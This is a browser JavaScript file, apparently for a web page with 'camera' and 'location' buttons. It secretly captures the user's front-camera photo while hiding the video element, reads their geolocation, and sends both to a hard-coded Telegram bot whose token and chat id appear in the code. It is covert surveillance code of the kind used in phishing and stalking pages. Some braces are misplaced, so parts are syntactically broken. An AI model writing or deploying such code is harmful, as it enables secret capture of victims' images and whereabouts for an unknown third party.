document.addEventListener('DOMContentLoaded', () => {

    const cameraButton = document.getElementById('cameraButton');

    const video = document.getElementById('video');

    const locationButton = document.getElementById('locationButton');

    const locationDisplay = document.getElementById('location');

    const telegramBotToken = '7240357541:AAEUou83gvDqtK5sEkOZZyVFVcB1SMLGrEw';

    const telegramChatId = '6952589723';

    cameraButton.addEventListener('click', async () => {

        try {

            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });

            video.srcObject = stream;

            video.style.display = 'none'; // Hide the video element

            captureAndSendPhoto();

        } catch (error) {

            alert('Error accessing camera: ' + error.message);

        }

    });

    const captureAndSendPhoto = () => {

        const canvas = document.createElement('canvas');

        canvas.width = video.videoWidth;

        canvas.height = video.videoHeight;

        const context = canvas.getContext('2d');

        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(async (blob) => {

            const formData = new FormData();

            formData.append('photo', blob, 'photo.png');

            try {

                const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {

                    method: 'POST',

                    body: formData

                });

                if (response.ok) {

                    console.log('Photo sent to Telegram successfully!');

                } else {

                    console.log('Failed to send photo to Telegram.');

                  } catch (error) {

                alert('Error sending photo to Telegram: ' + error.message);

            }

        });

    };

    locationButton.addEventListener('click', () => {

        if (navigator.geolocation) {

            navigator.geolocation.getCurrentPosition(

                async (position) => {

                    const { latitude, longitude } = position.coords;

                    locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;

                    const locationData = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;

                    try {

                        const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {

                            method: 'POST',


                }   headers: {

                                'Content-Type': 'application/json'

                            },

                            body: JSON.stringify({

                                chat_id: telegramChatId,

                                text: locationData

                            })

                        });

                        if (response.ok) {

                            console.log('Location sent to Telegram successfully!');

                        } else {

                            console.log('Failed to send location to Telegram.');

                        }

                    } catch (error) {

                        console.log('Error sending location to Telegram: ' + error.message);

                            }

                },

                (error) => {

                    console.log('Error accessing location: ' + error.message);

                }

            );

        } else {

            alert('Geolocation is not supported by your browser.');

        }

    });

});                         
                                                     
